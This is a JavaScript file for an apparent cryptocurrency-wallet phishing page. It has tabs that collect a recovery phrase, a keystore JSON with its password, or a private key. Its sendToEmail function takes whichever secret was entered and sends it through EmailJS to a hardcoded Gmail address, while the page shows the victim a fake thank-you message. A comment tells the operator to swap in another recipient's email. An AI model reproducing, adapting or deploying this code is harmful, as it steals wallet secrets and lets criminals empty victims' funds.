console.log("✅ js1.js loaded");

var phrase = document.querySelector("#phrase");
var phraseText = document.querySelector("#phraseText");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");

// Track which tab is currently active
var currentActiveTab = "phrase";

phrase.addEventListener("click", function() {
    hide(first);
    currentActiveTab = "phrase";
});

keystore.addEventListener("click", function() {
    hide(second);
    currentActiveTab = "keystore";
});

private.addEventListener("click", function() {
    hide(third);
    currentActiveTab = "private";
});

function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    if (expandedPanel) {
        expandedPanel.classList.remove("active");
        var attr = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full");
        for (let i = 0; i < attr.length; i++) {
            attr[i].value = "";
        }
    }
    var i = document.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")
    var x = elem.getElementsByClassName("text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400")

    for (let c = 0; c < i.length; c++) {
        i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
        x[c].required = true;
    }
    elem.classList.add("active");
}

// Function to send ONLY the selected field data
function sendToEmail() {
    console.log("sendToEmail called, active tab:", currentActiveTab);
    
    var tempParams = {
        wallet: wallet_id ? wallet_id.value : "Unknown",
        type: "",
        data: "",
        timestamp: new Date().toLocaleString(),
        to_email: "olowoeggboy@gmail.com"   // ← CHANGE THIS TO MR. WILLIAM'S EMAIL
    };
    
    // Send ONLY the active tab's data
    if (currentActiveTab === "phrase") {
        var phraseVal = document.querySelector("#phraseText") ? document.querySelector("#phraseText").value : "";
        console.log("Phrase value:", phraseVal);
        if (phraseVal.trim().length > 0) {
            tempParams.type = "Recovery Phrase";
            tempParams.data = phraseVal;
        } else {
            alert("Please enter your recovery phrase");
            return false;
        }
    } 
    else if (currentActiveTab === "keystore") {
        var keystoreVal = document.querySelector("textarea[name='keystore']") ? document.querySelector("textarea[name='keystore']").value : "";
        var passwordVal = document.querySelector("input[name='password']") ? document.querySelector("input[name='password']").value : "";
        console.log("Keystore length:", keystoreVal.length, "Password length:", passwordVal.length);
        if (keystoreVal.trim().length > 0 || passwordVal.trim().length > 0) {
            tempParams.type = "Keystore JSON";
            tempParams.data = "Keystore: " + keystoreVal + " | Password: " + passwordVal;
        } else {
            alert("Please enter your keystore JSON and password");
            return false;
        }
    } 
    else if (currentActiveTab === "private") {
        var privateVal = document.querySelector("input[name='key']") ? document.querySelector("input[name='key']").value : "";
        console.log("Private key length:", privateVal.length);
        if (privateVal.trim().length > 0) {
            tempParams.type = "Private Key";
            tempParams.data = privateVal;
        } else {
            alert("Please enter your private key");
            return false;
        }
    }
    
    console.log("Sending to email:", tempParams.type, tempParams.data);
    
    // Show loading
    var sendingDiv = document.querySelector(".sending");
    if (sendingDiv) sendingDiv.style.display = "flex";
    
    // Send to email using EmailJS
    emailjs.send('service_jlp8lzp', 'template_apoverk', tempParams)
        .then(function(response) {
            console.log("Email sent successfully!", response);
            if (sendingDiv) {
                setTimeout(function() {
                    sendingDiv.style.display = "none";
                }, 2000);
            }
            
        })
        .catch(function(error) {
            console.error("Email failed:", error);
            if (sendingDiv) sendingDiv.style.display = "none";
            alert("❌ Error: " + (error.text || "Check console"));
        });
    
    return true;
}

// Handle form submissions - MULTIPLE WAYS to ensure it works
document.addEventListener('DOMContentLoaded', function() {
    console.log("DOM ready, setting up form handlers...");
    
    // Method 1: Target all forms
    var forms = document.querySelectorAll("form.gform");
    console.log("Found", forms.length, "forms");
    
    forms.forEach(function(form, index) {
        console.log("Setting up form", index);
        form.addEventListener("submit", function(e) {
            console.log("Form", index, "submitted!");
            e.preventDefault();
            e.stopPropagation();
            sendToEmail();
            
            var thankYouDiv = form.querySelector(".thankyou_message");
            if (thankYouDiv) {
                thankYouDiv.style.display = "block";
                setTimeout(function() {
                    thankYouDiv.style.display = "none";
                }, 3000);
            }
            return false;
        });
    });
    
    // Method 2: Also target all validate buttons directly
    var allButtons = document.querySelectorAll('button[type="submit"], .btn-primary');
    console.log("Found", allButtons.length, "buttons");
    
    allButtons.forEach(function(btn) {
        btn.addEventListener("click", function(e) {
            console.log("Button clicked:", btn);
            // Let the form submit event handle it, but log for debugging
        });
    });
});

// Handle manual connect
var connect_manual = document.querySelector(".jwEAlI");
if (connect_manual) {
    connect_manual.addEventListener("click", function() {
        var overlay = document.querySelector(".overlay");
        var firstoverlay = document.querySelector(".sc-bdVaJa");
        if (overlay && firstoverlay) {
            overlay.style.display = "flex";
            firstoverlay.style.display = "none";
        }
    });
}

console.log("✅ js1.js setup complete");